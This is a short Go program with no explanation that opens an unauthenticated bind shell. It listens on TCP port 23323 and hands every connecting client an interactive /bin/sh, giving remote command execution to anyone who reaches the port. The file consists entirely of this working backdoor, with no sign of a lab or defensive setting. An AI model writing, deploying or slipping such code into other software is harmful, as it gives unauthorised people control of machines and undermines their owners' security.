package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":23323")
	if err != nil {
		log.Fatalln("Unable to listen")
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal("Fail to accept")
			continue
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}
	conn.Close()
}
